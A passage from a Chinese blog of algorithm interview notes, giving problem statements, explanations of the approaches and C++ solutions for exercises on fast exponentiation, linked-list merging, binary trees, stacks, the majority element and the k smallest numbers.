(value % <span class="number">2</span> == <span class="number">1</span>); &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="数值的整数次幂"><a href="#数值的整数次幂" class="headerlink" title="数值的整数次幂"></a>数值的整数次幂</h1><h2 id="题目-9"><a href="#题目-9" class="headerlink" title="题目"></a>题目</h2><p>给定一个double类型的浮点数base和int类型的整数exponent。求base的exponent次方。<br>保证base和exponent不同时为0</p>
<h2 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h2><ul>
<li>简单快速幂算法</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">double</span> <span class="title">Power</span><span class="params">(<span class="type">double</span> base, <span class="type">int</span> exponent)</span> </span>&#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> tmp = <span class="built_in">abs</span>(exponent);</span><br><span class="line">        <span class="type">double</span> r = <span class="number">1.0</span>;</span><br><span class="line">        <span class="keyword">while</span> (tmp) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tmp &amp; (<span class="type">unsigned</span>) <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="comment">//对应位是1时，乘以base</span></span><br><span class="line">                r *= base;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//tmp移位，base要平方</span></span><br><span class="line">            base *= base;</span><br><span class="line">            tmp &gt;&gt;= (<span class="type">unsigned</span>) <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> exponent &lt; <span class="number">0</span> ? <span class="number">1</span> / r : r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="合并两个排序的列表"><a href="#合并两个排序的列表" class="headerlink" title="合并两个排序的列表"></a>合并两个排序的列表</h1><h2 id="题目-10"><a href="#题目-10" class="headerlink" title="题目"></a>题目</h2><p>输入两个单调递增的链表，输出两个链表合成后的链表，当然我们需要合成后的链表满足单调不减规则。</p>
<h2 id="思路-12"><a href="#思路-12" class="headerlink" title="思路"></a>思路</h2><h3 id="非递归版本"><a href="#非递归版本" class="headerlink" title="非递归版本"></a>非递归版本</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> ListNode *<span class="title">Merge</span><span class="params">(ListNode *pHead1, ListNode *pHead2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pHead1 == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> pHead2;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pHead2 == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> pHead1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ListNode* result = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">if</span> (pHead1-&gt;val &lt; pHead2-&gt;val) &#123;</span><br><span class="line">            result = pHead1;</span><br><span class="line">            pHead1 = pHead1-&gt;next;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result = pHead2;</span><br><span class="line">            pHead2 = pHead2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ListNode* pTmp = result;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pHead1 == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                pTmp-&gt;next = pHead2;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pHead2 == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                pTmp-&gt;next = pHead1;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pHead1-&gt;val &lt; pHead2-&gt;val) &#123;</span><br><span class="line">                pTmp-&gt;next = pHead1;</span><br><span class="line">                pHead1 = pHead1-&gt;next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                pTmp-&gt;next = pHead2;</span><br><span class="line">                pHead2 = pHead2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            pTmp = pTmp-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="递归版本"><a href="#递归版本" class="headerlink" title="递归版本"></a>递归版本</h3><ul>
<li>合并链表选出较大的节点，下一跳时剩下两个链表再选</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> ListNode *<span class="title">Merge</span><span class="params">(ListNode *pHead1, ListNode *pHead2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pHead1 == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> pHead2;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pHead2 == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> pHead1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ListNode* result = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">if</span> (pHead1-&gt;val &lt; pHead2-&gt;val) &#123;</span><br><span class="line">            result = pHead1;</span><br><span class="line">            result-&gt;next = <span class="built_in">Merge</span>(pHead1-&gt;next, pHead2);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result = pHead2;</span><br><span class="line">            result-&gt;next = <span class="built_in">Merge</span>(pHead2-&gt;next, pHead1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="二叉树的镜像"><a href="#二叉树的镜像" class="headerlink" title="二叉树的镜像"></a>二叉树的镜像</h1><h2 id="题目-11"><a href="#题目-11" class="headerlink" title="题目"></a>题目</h2><p>操作给定的二叉树，将其变换为源二叉树的镜像。</p>
<p>输入描述:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二叉树的镜像定义：源二叉树</span><br><span class="line">                    8</span><br><span class="line">                   /  \</span><br><span class="line">                  6   10</span><br><span class="line">                 / \  / \</span><br><span class="line">                 5  7 9 11</span><br><span class="line">    	        镜像二叉树</span><br><span class="line">    	            8</span><br><span class="line">    	           /  \</span><br><span class="line">    	          10   6</span><br><span class="line">    	         / \  / \</span><br><span class="line">    	        11 9 7  5</span><br></pre></td></tr></table></figure>

<h2 id="思路-13"><a href="#思路-13" class="headerlink" title="思路"></a>思路</h2><h3 id="递归版本-1"><a href="#递归版本-1" class="headerlink" title="递归版本"></a>递归版本</h3><ul>
<li>二叉树遍历，前序和后序都行，做操作即可</li>
<li>详见: <a href="/blogs/2018-09-18-algorithmStudy/#towTree">二叉树遍历</a></li>
</ul>
<h3 id="非递归版本-1"><a href="#非递归版本-1" class="headerlink" title="非递归版本"></a>非递归版本</h3><ul>
<li>进行广度优先遍历或者深度优先遍历</li>
<li>弹出一个节点就交换其左右子树</li>
<li>详见: <a href="/blogs/2018-09-18-algorithmStudy/#treeSpan">广度优先和深度优先遍历</a></li>
</ul>
<h1 id="树的子结构"><a href="#树的子结构" class="headerlink" title="树的子结构"></a>树的子结构</h1><h2 id="题目-12"><a href="#题目-12" class="headerlink" title="题目"></a>题目</h2><p>输入两棵二叉树A，B，判断B是不是A的子结构。（ps：我们约定空树不是任意一个树的子结构）</p>
<h2 id="思路-14"><a href="#思路-14" class="headerlink" title="思路"></a>思路</h2><p>直接递归实现，查找根节点，然后递归查找子节点</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">struct TreeNode &#123;</span></span><br><span class="line"><span class="comment">    int val;</span></span><br><span class="line"><span class="comment">    struct TreeNode *left;</span></span><br><span class="line"><span class="comment">    struct TreeNode *right;</span></span><br><span class="line"><span class="comment">    TreeNode(int x) :</span></span><br><span class="line"><span class="comment">            val(x), left(NULL), right(NULL) &#123;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;;*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">bool</span> <span class="title">HasSubtree</span><span class="params">(TreeNode* pRoot1, TreeNode* pRoot2)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pRoot1 == <span class="literal">nullptr</span> || pRoot2 == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">HasSubtree1</span>(pRoot1, pRoot2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">bool</span> <span class="title">HasSubtree1</span><span class="params">(TreeNode* pRoot1, TreeNode* pRoot2)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pRoot1 == <span class="literal">nullptr</span> || pRoot2 == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> pRoot2 == <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pRoot1-&gt;val == pRoot2-&gt;val &amp;&amp;</span><br><span class="line">            <span class="built_in">HasSubtree1</span>(pRoot1-&gt;right, pRoot2-&gt;right) &amp;&amp;</span><br><span class="line">            <span class="built_in">HasSubtree1</span>(pRoot1-&gt;left, pRoot2-&gt;left)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">HasSubtree1</span>(pRoot1-&gt;right, pRoot2) || <span class="built_in">HasSubtree1</span>(pRoot1-&gt;left, pRoot2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="从上往下打印二叉树"><a href="#从上往下打印二叉树" class="headerlink" title="从上往下打印二叉树"></a>从上往下打印二叉树</h1><h2 id="题目-13"><a href="#题目-13" class="headerlink" title="题目"></a>题目</h2><p>从上往下打印出二叉树的每个节点，同层节点从左至右打印。</p>
<h2 id="思路-15"><a href="#思路-15" class="headerlink" title="思路"></a>思路</h2><p>二叉树的广度优先遍历，参考<a href="/blogs/2018-09-18-algorithmStudy/#treeSpan">广度优先遍历</a></p>
<h1 id="栈的压入、弹出序列"><a href="#栈的压入、弹出序列" class="headerlink" title="栈的压入、弹出序列"></a>栈的压入、弹出序列</h1><h2 id="题目-14"><a href="#题目-14" class="headerlink" title="题目"></a>题目</h2><p>输入两个整数序列，第一个序列表示栈的压入顺序，请判断第二个序列是否可能为该栈的弹出顺序。假设压入栈的所有数字均不相等。例如序列1,2,3,4,5是某栈的压入顺序，序列4,5,3,2,1是该压栈序列对应的一个弹出序列，但4,3,5,1,2就不可能是该压栈序列的弹出序列。（注意：这两个序列的长度是相等的）</p>
<h2 id="思路-16"><a href="#思路-16" class="headerlink" title="思路"></a>思路</h2><p>模拟这个过程</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">bool</span> <span class="title">IsPopOrder</span><span class="params">(vector&lt;<span class="type">int</span>&gt; pushV, vector&lt;<span class="type">int</span>&gt; popV)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> size = pushV.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span> (size == <span class="number">0</span> || size != popV.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; test;</span><br><span class="line">        <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; size) &#123;</span><br><span class="line">            test.<span class="built_in">push</span>(pushV[i++]);</span><br><span class="line">            <span class="keyword">while</span> (!test.<span class="built_in">empty</span>() &amp;&amp; test.<span class="built_in">top</span>() == popV[j]) &#123;</span><br><span class="line">                test.<span class="built_in">pop</span>();</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> test.<span class="built_in">empty</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="包含min函数的栈"><a href="#包含min函数的栈" class="headerlink" title="包含min函数的栈"></a>包含min函数的栈</h1><h2 id="题目-15"><a href="#题目-15" class="headerlink" title="题目"></a>题目</h2><p>定义栈的数据结构，请在该类型中实现一个能够得到栈中所含最小元素的min函数（时间复杂度应为O（1））。</p>
<h2 id="思路-17"><a href="#思路-17" class="headerlink" title="思路"></a>思路</h2><p>两个栈，一个放数据，一个放最小值的一个栈</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (m_minData.<span class="built_in">empty</span>() || value &lt;= m_minData.<span class="built_in">top</span>()) &#123;</span><br><span class="line">            m_minData.<span class="built_in">push</span>(value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        m_data.<span class="built_in">push</span>(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (m_minData.<span class="built_in">top</span>() == m_data.<span class="built_in">top</span>()) &#123;</span><br><span class="line">            m_minData.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        m_data.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> m_data.<span class="built_in">top</span>(); &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">min</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (m_minData.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> m_minData.<span class="built_in">top</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; m_data;</span><br><span class="line">    stack&lt;<span class="type">int</span>&gt; m_minData;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="顺时针打印矩阵"><a href="#顺时针打印矩阵" class="headerlink" title="顺时针打印矩阵"></a>顺时针打印矩阵</h1><h2 id="题目-16"><a href="#题目-16" class="headerlink" title="题目"></a>题目</h2><p>输入一个矩阵，按照从外向里以顺时针的顺序依次打印出每一个数字，例如，如果输入如下4 X 4矩阵： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 则依次打印出数字1,2,3,4,8,12,16,15,14,13,9,5,6,7,11,10.</p>
<h2 id="思路-18"><a href="#思路-18" class="headerlink" title="思路"></a>思路</h2><p>强解，直接使用四个变量保存起始位置，不断循环打印即可</p>
<h1 id="数组中出现次数超过一半的数字"><a href="#数组中出现次数超过一半的数字" class="headerlink" title="数组中出现次数超过一半的数字"></a>数组中出现次数超过一半的数字</h1><h2 id="题目-17"><a href="#题目-17" class="headerlink" title="题目"></a>题目</h2><p>数组中有一个数字出现的次数超过数组长度的一半，请找出这个数字。例如输入一个长度为9的数组{1,2,3,2,2,2,5,4,2}。由于数字2在数组中出现了5次，超过数组长度的一半，因此输出2。如果不存在则输出0。</p>
<h2 id="思路-19"><a href="#思路-19" class="headerlink" title="思路"></a>思路</h2><h3 id="统计"><a href="#统计" class="headerlink" title="统计"></a>统计</h3><p>使用map储存，遍历将数组每个值出现次数统计出来，找最多的对比size</p>
<h3 id="排序取中值"><a href="#排序取中值" class="headerlink" title="排序取中值"></a>排序取中值</h3><p>将数组排序，中位数即为出现超过一半的，找出验证一下出现次数是否超过一半</p>
<h3 id="相消"><a href="#相消" class="headerlink" title="相消"></a>相消</h3><p>由于出现次数超过一半，所以不断排除两个不一样的数字，超过一半的数字一定会留在最后一个，验证一下输出</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//巧解，排除相同的数，留下的即为所求</span></span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">MoreThanHalfNum_Solution2</span><span class="params">(vector&lt;<span class="type">int</span>&gt; numbers)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> size = numbers.<span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> times = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;tmp : numbers) &#123;</span><br><span class="line">            <span class="keyword">if</span> (times == <span class="number">0</span>) &#123;</span><br><span class="line">                result = tmp;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (result == tmp) &#123;</span><br><span class="line">                times++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            times--;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">count</span>(numbers.<span class="built_in">begin</span>(), numbers.<span class="built_in">end</span>(), result) &gt; size / <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="二叉搜索树后序遍历数组校验"><a href="#二叉搜索树后序遍历数组校验" class="headerlink" title="二叉搜索树后序遍历数组校验"></a>二叉搜索树后序遍历数组校验</h1><h2 id="题目-18"><a href="#题目-18" class="headerlink" title="题目"></a>题目</h2><p>输入一个整数数组，判断该数组是不是某二叉搜索树的后序遍历的结果。如果是则输出Yes,否则输出No。假设输入的数组的任意两个数字都互不相同。</p>
<h2 id="思路-20"><a href="#思路-20" class="headerlink" title="思路"></a>思路</h2><ul>
<li>二叉树搜索树满足根节点比左边大，比右边小</li>
<li>后序遍历，根节点在最后</li>
<li>从后向前，判断最后一个树比数组前一部分都大，比后一部分都小</li>
<li>找到分割点，递归判断前一部分和后一部分分别满足二叉搜索树后序遍历</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">bool</span> <span class="title">VerifySquenceOfBST</span><span class="params">(vector&lt;<span class="type">int</span>&gt; sequence)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> !sequence.<span class="built_in">empty</span>() &amp;&amp;</span><br><span class="line">            <span class="built_in">VerifySquenceOfBST</span>(sequence.<span class="built_in">begin</span>().<span class="built_in">base</span>(), sequence.<span class="built_in">size</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">bool</span> <span class="title">VerifySquenceOfBST</span><span class="params">(<span class="type">const</span> <span class="type">int</span> arr[], <span class="type">int</span> length)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (length &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> result = length;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="comment">//异或，当false时，最后一位要比前面大，否则进判断；true时最后一位要比前面小，否则进逻辑</span></span><br><span class="line">            <span class="keyword">if</span> (flag ^ (arr[i] &gt; arr[length - <span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                    <span class="comment">//找到中间点后，出现小的，返回false</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//中间点转判断</span></span><br><span class="line">                flag = <span class="literal">true</span>;</span><br><span class="line">                result = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (i == length - <span class="number">1</span>) ||</span><br><span class="line">            (<span class="built_in">VerifySquenceOfBST</span>(arr, result) &amp;&amp;</span><br><span class="line">                <span class="built_in">VerifySquenceOfBST</span>(arr + result, length - result - <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="最小k个数"><a href="#最小k个数" class="headerlink" title="最小k个数"></a><span id="minKNumber">最小k个数</span></h1><h2 id="题目-19"><a href="#题目-19" class="headerlink" title="题目"></a>题目</h2><p>输入n个整数，找出其中最小的K个数。例如输入4,5,1,6,2,7,3,8这8个数字，则最小的4个数字是1,2,3,4,。</p>
<h2 id="思路-21"><a href="#思路-21" class="headerlink" title="思路"></a>思路</h2><h3 id="排序后取前k个值"><a href="#排序后取前k个值" class="headerlink" title="排序后取前k个值"></a>排序后取前k个值</h3><ul>
<li>将数组排序后取前k个值返回</li>
</ul>
<h3 id="维护一个k个值的数组，找到最小的k个值"><a href="#维护一个k个值的数组，找到最小的k个值" class="headerlink" title="维护一个k个值的数组，找到最小的k个值"></a>维护一个k个值的数组，找到最小的k个值</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 遍历，找到最小的k个值</span></span><br><span class="line">    <span class="function"><span class="type">static</span> vector&lt;<span class="type">int</span>&gt; <span class="title">GetLeastNumbers_Solution</span><span class="params">(vector&lt;<span class="type">int</span>&gt; input, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> inputSize = input.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span> (k == <span class="number">0</span> || k &gt; inputSize) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">result</span><span class="params">(k)</span></span>;</span><br><span class="line">        <span class="type">int</span> size = <span class="number">1</span>;</span><br><span class="line">        result[<span class="number">0</span>] = input[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// 遍历数组</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; inputSize; i++) &#123;</span><br><span class="line">            <span class="comment">// 不到k，且大于最后一位，直接放到最后一位</span></span><br><span class="line">            <span class="keyword">if</span> (size &lt; k &amp;&amp; input[i] &gt; result[size - <span class="number">1</span>]) &#123;</span><br><span class="line">                result[size] = input[i];</span><br><span class="line">                size++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 数组个数不到k，或者tmp小于数组最大值</span></span><br><span class="line">            <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;size %d, result[size - 1] %d, input[i] %d&quot;</span>, size,</span><br><span class="line">                    result[size - <span class="number">1</span>], input[i]);</span><br><span class="line">            <span class="keyword">if</span> (size &lt; k || input[i] &lt; result[size - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (size &lt; k) &#123;</span><br><span class="line">                    <span class="comment">// 不到k，最后一位在上面判断了肯定大于输入</span></span><br><span class="line">                    result[size] = result[size - <span class="number">1</span>];</span><br><span class="line">                    size++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 从最后一位开始，如果前一位大于tmp，后移，直到不大于跳出</span></span><br><span class="line">                <span class="type">int</span> j = size - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">for</span> (; j &gt; <span class="number">0</span> &amp;&amp; result[j - <span class="number">1</span>] &gt; input[i]; --j) &#123;</span><br><span class="line">                    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;j %d, result[j - 1] %d&quot;</span>, j, result[j - <span class="number">1</span>]);</span><br><span class="line">                    result[j] = result[j - <span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 跳出后，j指向要放的位置</span></span><br><span class="line">                result[j] = input[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="大根堆"><a href="#大根堆" class="headerlink" title="大根堆"></a>大根堆</h3><ul>
<li>维护一个k个值的大根堆</li>
<li>遍历和堆顶比，小于则弹出堆顶，插入新元素排序</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 最小堆解问题，C++标准接口</span></span><br><span class="line">    <span class="function"><span class="type">static</span> vector&lt;<span class="type">int</span>&gt; <span class="title">GetLeastNumbers_Solution</span><span class="params">(vector&lt;<span class="type">int</span>&gt; input, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> inputSize = input.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span> (k == <span class="number">0</span> || k &gt; inputSize) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">result</span><span class="params">(input.begin(), input.begin() + k + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="comment">// 插入前k+1个值并对前k个值构造最大堆</span></span><br><span class="line">        <span class="built_in">make_heap</span>(result.<span class="built_in">begin</span>(), result.<span class="built_in">begin</span>() + k);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断，如果大于最大节点，替换并重构最大堆</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = k; i &lt; inputSize; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (input[i] &lt; result[<span class="number">0</span>]) &#123;</span><br><span class="line">                result[k] = input[i];</span><br><span class="line">                <span class="comment">// 弹出堆顶，重排序大根堆</span></span><br><span class="line">                <span class="comment">// pop_heap做的操作是将头部和尾部互换，然后对[begin, end - 1)构造最大堆</span></span><br><span class="line">                <span class="built_in">pop_heap</span>(result.<span class="built_in">begin</span>(), result.<span class="built_in">end</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 多余一个删掉</span></span><br><span class="line">        result.<span class="built_in">pop_back</span>();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="明明的随机数"><a href="#明明的随机数" class="headerlink" title="明明的随机数"></a>明明的随机数</h1><h2 id="题目-20"><a href="#题目-20" class="headerlink" title="题目"></a>题目</h2><p>明明想在学校中请一些同学一起做一项问卷调查，为了实验的客观性，他先用计算机生成了N个1到1000之间的随机整数（N≤1000），对于其中重复的数字，只保留一个，把其余相同的数去掉，不同的数对应着不同的学生的学号。然后再把这些数从小到大排序，按照排好的顺序去找同学做调查。请你协助明明完成“去重”与“排序”的工作(同一个测试用例里可能会有多组数据，希望大家能正确处理)。</p>
<h2 id="思路-22"><a href="#思路-22" class="headerlink" title="思路"></a>思路</h2><ul>
